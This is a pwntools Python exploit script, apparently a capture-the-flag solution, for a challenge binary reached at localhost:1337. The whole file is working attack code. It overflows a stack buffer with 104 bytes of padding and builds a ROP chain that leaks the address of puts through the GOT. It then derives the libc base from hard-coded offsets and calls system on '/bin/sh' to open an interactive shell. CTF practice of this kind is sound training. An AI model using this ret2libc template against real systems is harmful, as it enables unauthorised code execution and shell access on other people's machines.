from pwn import *

context.terminal = ['wt.exe','wsl.exe']
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)  

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('localhost', 1337, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b main
c
'''.format(**locals())

# context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def main():
    p = start()

    rop = ROP(elf)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    got_puts = elf.got['puts']
    plt_puts = elf.plt['puts']

    payload = flat([
        b'A' * 104,
        pop_rdi,
        got_puts,
        plt_puts,
        elf.sym['main']
    ])

    p.sendline(b'Gengg.')
    p.sendline(payload)

    p.recvuntil(b"Welcome Gengg.")
    puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
    log.info(f'puts addr: {hex(puts_addr)}')

    libc.address = puts_addr - 0x87cc0
    log.info(f'libc base: {hex(libc.address)}')

    system = libc.address + 0x58750
    bin_sh = libc.address + 0x1cc42f
    ret = rop.find_gadget(["ret"])[0]

    payload = flat([
        b'A' * 104,
        pop_rdi,
        bin_sh,
        ret,
        system
    ])

    p.sendline(b'Gengg.')
    p.sendline(payload)
    
    p.interactive()

if __name__ == '__main__':
    main()
